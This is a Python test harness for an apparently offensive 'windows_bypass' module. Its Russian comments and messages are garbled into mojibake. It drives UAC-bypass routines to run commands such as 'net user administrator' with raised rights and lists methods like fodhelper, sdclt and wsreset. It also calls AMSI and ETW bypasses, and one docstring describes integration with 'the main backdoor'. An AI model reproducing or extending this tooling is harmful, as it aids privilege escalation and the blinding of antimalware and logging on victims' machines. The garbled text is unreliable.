#!/usr/bin/env python3
"""
–¢–µ—Å—Ç–æ–≤—ã–π —Å–∫—Ä–∏–ø—Ç –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ Windows Bypass —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç–∏.
"""

import platform
import sys
from windows_bypass import WindowsBypass, test_windows_bypass

def test_bypass_methods():
    """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç —Ä–∞–∑–ª–∏—á–Ω—ã–µ –º–µ—Ç–æ–¥—ã bypass."""
    print("üß™ –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï WINDOWS BYPASS –ú–ï–¢–û–î–û–í")
    print("=" * 50)
    
    if platform.system() != "Windows":
        print("‚ùå –≠—Ç–æ—Ç —Ç–µ—Å—Ç –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω —Ç–æ–ª—å–∫–æ –¥–ª—è Windows")
        return
    
    bypass = WindowsBypass()
    
    print(f"üìä –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ:")
    print(f"  –û–°: {platform.system()} {platform.release()}")
    print(f"  –í–µ—Ä—Å–∏—è: {bypass.windows_version}")
    print(f"  –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä: {bypass.is_admin}")
    
    print(f"\nüõ°Ô∏è –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ UAC Bypass:")
    test_commands = [
        "echo UAC bypass test successful",
        "whoami",
        "net user",
        "dir C:\\Windows\\System32"
    ]
    
    for cmd in test_commands:
        print(f"\n  –ö–æ–º–∞–Ω–¥–∞: {cmd}")
        result = bypass.bypass_uac(cmd)
        print(f"    –£—Å–ø–µ—Ö: {result['success']}")
        print(f"    –ú–µ—Ç–æ–¥: {result['method']}")
        if result['error']:
            print(f"    –û—à–∏–±–∫–∞: {result['error']}")
    
    print(f"\nüîí –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ AMSI Bypass:")
    amsi_result = bypass.bypass_amsi()
    print(f"  –£—Å–ø–µ—Ö: {amsi_result['success']}")
    print(f"  –ú–µ—Ç–æ–¥: {amsi_result['method']}")
    if amsi_result['error']:
        print(f"  –û—à–∏–±–∫–∞: {amsi_result['error']}")
    
    print(f"\nüìä –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ ETW Bypass:")
    etw_result = bypass.bypass_etw()
    print(f"  –£—Å–ø–µ—Ö: {etw_result['success']}")
    print(f"  –ú–µ—Ç–æ–¥: {etw_result['method']}")
    if etw_result['error']:
        print(f"  –û—à–∏–±–∫–∞: {etw_result['error']}")
    
    print(f"\nüéØ –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ Elevated Command:")
    elevated_result = bypass.execute_command_elevated("net user administrator")
    print(f"  –£—Å–ø–µ—Ö: {elevated_result['success']}")
    print(f"  –ú–µ—Ç–æ–¥: {elevated_result['bypass_method']}")
    if elevated_result['output']:
        print(f"  –í—ã–≤–æ–¥: {elevated_result['output'][:100]}...")
    if elevated_result['error']:
        print(f"  –û—à–∏–±–∫–∞: {elevated_result['error']}")
    
    print(f"\n‚úÖ –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ")

def test_integration():
    """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏—é —Å –æ—Å–Ω–æ–≤–Ω—ã–º –±—ç–∫–¥–æ—Ä–æ–º."""
    print("\nüîó –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï –ò–ù–¢–ï–ì–†–ê–¶–ò–ò")
    print("=" * 30)
    
    try:
        from windows_bypass import apply_windows_bypasses, bypass_uac_command
        
        print("üì¶ –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ apply_windows_bypasses:")
        results = apply_windows_bypasses()
        print(f"  –û–±—â–∏–π —É—Å–ø–µ—Ö: {results.get('overall_success', False)}")
        print(f"  UAC: {results.get('uac', {}).get('success', False)}")
        print(f"  AMSI: {results.get('amsi', {}).get('success', False)}")
        print(f"  ETW: {results.get('etw', {}).get('success', False)}")
        
        print("\nüì¶ –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ bypass_uac_command:")
        cmd_result = bypass_uac_command("echo Integration test")
        print(f"  –£—Å–ø–µ—Ö: {cmd_result['success']}")
        print(f"  –ú–µ—Ç–æ–¥: {cmd_result.get('bypass_method', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}")
        
        print("\n‚úÖ –ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è —Ä–∞–±–æ—Ç–∞–µ—Ç –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ")
        
    except ImportError as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –∏–º–ø–æ—Ä—Ç–∞: {e}")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–∏: {e}")

def test_security():
    """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å bypass –º–µ—Ç–æ–¥–æ–≤."""
    print("\nüîí –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–ò")
    print("=" * 30)
    
    bypass = WindowsBypass()
    
    # –¢–µ—Å—Ç–∏—Ä—É–µ–º —Ä–∞–∑–ª–∏—á–Ω—ã–µ –º–µ—Ç–æ–¥—ã UAC bypass
    methods = [
        "fodhelper", "computerdefaults", "slui", "sdclt", 
        "changepk", "wsreset", "ms-settings", "registry_auto_run",
        "task_scheduler", "wmic"
    ]
    
    print("üõ°Ô∏è –î–æ—Å—Ç—É–ø–Ω—ã–µ –º–µ—Ç–æ–¥—ã UAC bypass:")
    for method in methods:
        print(f"  - {method}")
    
    print(f"\nüîç –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∞–≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞:")
    print(f"  –¢–µ–∫—É—â–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {bypass.is_admin}")
    
    if bypass.is_admin:
        print("  ‚ö†Ô∏è –£–∂–µ –∑–∞–ø—É—â–µ–Ω —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞")
    else:
        print("  ‚úÖ –ó–∞–ø—É—â–µ–Ω —Å –æ–±—ã—á–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏")
    
    print("\n‚úÖ –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–æ")

def main():
    """–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è."""
    print("üöÄ –ó–ê–ü–£–°–ö –¢–ï–°–¢–û–í WINDOWS BYPASS")
    print("=" * 50)
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–ª–∞—Ç—Ñ–æ—Ä–º—É
    if platform.system() != "Windows":
        print("‚ùå –≠—Ç–æ—Ç –º–æ–¥—É–ª—å –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω —Ç–æ–ª—å–∫–æ –¥–ª—è Windows")
        print("üí° –î–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –Ω–∞ –¥—Ä—É–≥–∏—Ö –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞—Ö –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –¥—Ä—É–≥–∏–µ –º–æ–¥—É–ª–∏")
        return
    
    try:
        # –¢–µ—Å—Ç–∏—Ä—É–µ–º –±–∞–∑–æ–≤—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
        test_windows_bypass()
        
        # –¢–µ—Å—Ç–∏—Ä—É–µ–º –º–µ—Ç–æ–¥—ã bypass
        test_bypass_methods()
        
        # –¢–µ—Å—Ç–∏—Ä—É–µ–º –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏—é
        test_integration()
        
        # –¢–µ—Å—Ç–∏—Ä—É–µ–º –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å
        test_security()
        
        print("\nüéâ –í–°–ï –¢–ï–°–¢–´ –ó–ê–í–ï–†–®–ï–ù–´ –£–°–ü–ï–®–ù–û!")
        
    except Exception as e:
        print(f"\n‚ùå –û—à–∏–±–∫–∞ –≤–æ –≤—Ä–µ–º—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
